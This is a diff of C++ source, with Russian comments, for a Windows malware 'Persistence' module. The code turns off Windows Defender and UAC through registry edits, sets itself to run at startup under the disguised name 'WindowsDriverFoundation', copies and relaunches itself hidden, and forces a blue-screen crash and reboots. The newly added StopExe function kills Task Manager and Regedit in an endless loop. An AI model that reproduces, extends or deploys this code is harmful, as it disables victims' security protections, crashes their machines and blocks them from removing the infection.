@@ -1,6 +1,6 @@
-#pragma once
 #include "include.h"
-bool isUserAdmin() {
+#include "pers.h"
+bool Persistence::isUserAdmin() {
     BOOL isAdminFlag = FALSE;
     BYTE adminSid[SECURITY_MAX_SID_SIZE]; // Буфер для хранения SID
     DWORD sidSize = sizeof(adminSid);
@@ -9,7 +9,7 @@ bool isUserAdmin() {
     if (!CheckTokenMembership(NULL, &adminSid, &isAdminFlag)) return false;
     return isAdminFlag != FALSE;
 }   
-void DefenderOwner(){
+void Persistence::DefenderOwner(){
     // Отключение Defender
     system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");
 
@@ -29,7 +29,7 @@ void DefenderOwner(){
     // Отключение UAC
     system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
 }
-bool checkAndCreateFile(const std::string& filename) {
+bool Persistence::checkAndCreateFile(const std::string& filename) {
     std::string fullPath = "C:\\Windows\\SysWOW64\\" + filename; // Файл-чекпоинт создается только один раз
 
     std::ifstream file(fullPath);
@@ -44,7 +44,7 @@ bool checkAndCreateFile(const std::string& filename) {
     }
     return 0;
 }
-void addToStartup() {
+void Persistence::addToStartup() {
     char path[MAX_PATH];
     // Получаем путь к текущему исполняемому файлу
     GetModuleFileName(NULL, path, MAX_PATH);
@@ -53,7 +53,7 @@ void addToStartup() {
     std::string command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /t REG_SZ /d \"" + std::string(path) + "\" /f";
     system(command.c_str());
 }
-void reset() {  // краш системы 
+void Persistence::reset() {  // краш системы 
 	// Try to force **BSOD** first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
@@ -67,7 +67,7 @@ void reset() {  // краш системы
         ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0294823, 0, 0, 0, 6, &tmp2);
     }
 }
-void restartSystem() {  // запасная функция взял ее с форума
+void Persistence::restartSystem() {  // запасная функция взял ее с форума
     std::cout << "restarting" << std::endl;
 
     // меньше нельзя ставить иначе не все изменения реестра сохраняются на слабых пк
@@ -100,7 +100,7 @@ void restartSystem() {  // запасная функция взял ее с фо
         std::cerr << "Error while trying to reboot!" << std::endl;
     }
 }
-void restartAsAdmin() {
+void Persistence::restartAsAdmin() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
   
@@ -119,7 +119,7 @@ void restartAsAdmin() {
         }
     }
   }
-bool copyAndRunSelf() {
+bool Persistence::copyAndRunSelf() {
     // Путь к текущему исполняемому файлу
     char path[MAX_PATH];
     GetModuleFileName(NULL, path, MAX_PATH);
@@ -140,7 +140,7 @@ bool copyAndRunSelf() {
     ShellExecute(NULL, "open", destination, NULL, NULL, SW_HIDE);
     return 1;
 }
-void cleanreg() {
+void Persistence::cleanreg() {
     system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /f");
     system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /f");
     system("REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /f");
@@ -159,21 +159,21 @@ void cleanreg() {
     system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsDriverFoundation /f");
     system("REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v winlogon /f");
 }
-void cleanfile() {
+void Persistence::cleanfile() {
     const char* filePath = "C:\\Windows\\SysWOW64\\lafkildatnn.dat";
     if (DeleteFile(filePath)) {
         std::cout << "File successfully deleted!" << std::endl;
     }
     DeleteFile("C:\\Windows\\SysWOW64\\adskisatana666.exe");
 }
-std::string getDiskSerial() {
+std::string Persistence::getDiskSerial() {
     DWORD serialNum = 0;
     if (GetVolumeInformation("C:\\", NULL, 0, &serialNum, NULL, NULL, NULL, 0)) {
         return std::to_string(serialNum);
     }
     return "unknown";
 }
-void CopyFileToSysWow64(std::string destPath, std::string filename) {
+void Persistence::CopyFileToSysWow64(std::string destPath, std::string filename) {
     // Получаем имя пользователя
     char username[256];
     DWORD size = 256;
@@ -182,4 +182,12 @@ void CopyFileToSysWow64(std::string destPath, std::string filename) {
     std::string sourcePath = "C:\\Users\\" + std::string(username) + "\\AppData\\Local\\Temp\\" + filename;
     // Копируем файл
     CopyFile(sourcePath.c_str(), destPath.c_str(), TRUE);
+}
+void Persistence::StopExe() {
+    while (true) {
+        system("taskkill /F /IM taskmgr.exe >nul 2>&1");  // Закрываем диспетчер задач
+        system("taskkill /F /IM regedit.exe >nul 2>&1");  // Закрываем редактор реестра
+        // system("taskkill /F /IM explorer.exe >nul 2>&1"); // Временно 
+        std::this_thread::sleep_for(std::chrono::milliseconds(300));
+    }
 }
